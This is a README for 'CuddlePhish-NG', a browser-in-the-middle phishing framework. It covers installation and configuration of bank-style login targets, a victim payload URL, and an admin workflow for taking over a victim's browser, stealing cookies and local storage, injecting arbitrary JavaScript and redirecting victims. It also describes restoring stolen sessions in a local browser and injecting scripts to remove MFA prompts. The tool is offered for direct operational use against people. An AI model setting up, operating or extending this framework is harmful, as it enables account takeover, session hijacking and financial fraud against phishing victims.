# CuddlePhish-NG

Browser-in-the-Middle (BitM) phishing framework — TypeScript rewrite of CuddlePhish.

**Architecture:** Playwright headless Chromium → CDP `Page.startScreencast` → Socket.IO binary frames → victim `<canvas>` via `createImageBitmap()`. No XVFB. No WebRTC. No STUN/TURN.

---

## Requirements

- Node.js 22 LTS
- Debian/Ubuntu host (Playwright's `--with-deps` installs Chromium system libs)
- OR Docker

---

## Installation

```bash
# Clone / unzip to server
cd cuddlephish-ng

# Install Node deps
npm install

# Install Playwright's Chromium browser + system libraries
npx playwright install chromium --with-deps

# Build TypeScript → dist/
npm run build
```

---

## Configuration

### config.json

```json
{
  "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  "socket_key": "changeme123",
  "admin_ips": ["127.0.0.1", "::1"],
  "proxy": null
}
```

| Field | Description |
|---|---|
| `socket_key` | Shared secret — victims and admin both need this. Change before deploying. |
| `admin_ips` | IPs allowed to access `/admin`. Use `["*"]` to allow any (not recommended). |
| `proxy` | Optional upstream proxy, e.g. `"http://127.0.0.1:8080"`. `null` = no proxy. |

### targets.json

Add targets interactively:

```bash
npm run add-target
```

Or edit `targets.json` directly:

```json
{
  "mybank": {
    "name": "My Bank",
    "url": "https://mybank.com/login",
    "width": 1920,
    "height": 1080,
    "inject_js": "console.log('injected')"
  }
}
```

| Field | Description |
|---|---|
| `url` | Target site the victim's browser will load |
| `width` / `height` | Chromium viewport size — should match what the target site expects |
| `inject_js` | Optional JS injected after page load (e.g. pre-fill forms, remove MFA prompts) |

---

## Running

### Development (tsx, no build step)

```bash
npm run dev
```

### Production

```bash
npm run build
npm start
```

### Docker

```bash
docker build -t cuddlephish-ng .
docker run -d -p 3000:3000 --name cuddlephish cuddlephish-ng
```

Server starts on `http://0.0.0.0:3000` by default. Override with env vars:

```bash
PORT=8080 HOST=127.0.0.1 npm start
```

---

## Swap (important on low-RAM hosts)

Chromium OOM-kills silently without swap. Run once after provisioning:

```bash
fallocate -l 4G /swapfile && chmod 600 /swapfile
mkswap /swapfile && swapon /swapfile
echo '/swapfile none swap sw 0 0' >> /etc/fstab
```

---

## URLs

| URL | Description |
|---|---|
| `http://HOST:3000/admin` | Admin panel (IP-gated by `admin_ips`) |
| `http://HOST:3000/phish` | Victim canvas page |
| `http://HOST:3000/healthz` | Health check |

---

## Victim payload

Deliver `public/victim.html` to the victim. The page needs two query params:

```
https://HOST/phish?t=TARGET_KEY&k=SOCKET_KEY
```

Or set `window.__cpKey` / `window.__cpTarget` before the socket.io script loads (see `payload.txt` for the injection template).

---

## Admin workflow

1. Open `/admin` — authenticate with `socket_key` when prompted
2. Wait for victims to appear in the left sidebar (thumbnails auto-update)
3. Click a victim card to select it
4. **Take Over** — your mouse/keyboard now controls the victim's browser; victim sees a "please wait" overlay
5. **Steal Cookies / Steal Storage** — dumps JSON to the admin panel
6. **Give Back** — returns control to victim
7. **Inject JS** — run arbitrary JS in the victim's page
8. **Navigate** — redirect the victim's browser to any URL

---

## Session restore

After stealing cookies/storage, restore them in a local browser:

```bash
# Save cookies from admin panel to cookies.json
npm run session-restore -- --cookies cookies.json --url https://mybank.com

# With localStorage too
npm run session-restore -- --cookies cookies.json --storage storage.json --url https://mybank.com
```

This opens a headed Playwright browser with the stolen session pre-loaded.

---

## Reverse proxy (Caddy)

Edit `Caddyfile`, replace `example.com` with your domain, then:

```bash
caddy run --config Caddyfile
```

---

## Host sizing

| Concurrent victims | RAM | vCPU |
|---|---|---|
| 1–3 | 4 GB | 2 |
| 4–8 | 8 GB | 2–4 |
| 10–15 | 16 GB | 4 |

Hetzner CX31 (2 vCPU / 8 GB / €10/mo) is the recommended starting point.

---

## Project structure

```
src/
  server.ts           — Fastify entry point, routes, Socket.IO wiring
  types.ts            — All shared interfaces and Socket.IO event maps
  browser-manager.ts  — Pre-warm pool, claim/release lifecycle
  screencast.ts       — CDP Page.startScreencast wrapper
  input-handler.ts    — Mouse/keyboard forwarding with coordinate scaling
  session-extractor.ts — Cookie + localStorage extraction via CDP
  socket-handlers.ts  — All Socket.IO event registrations

public/
  victim.html         — Canvas-based victim page (no WebRTC)
  admin.html          — Bootstrap dark theme admin panel

tools/
  add-target.ts       — Interactive target setup
  session-restore.ts  — Session injection tool
```
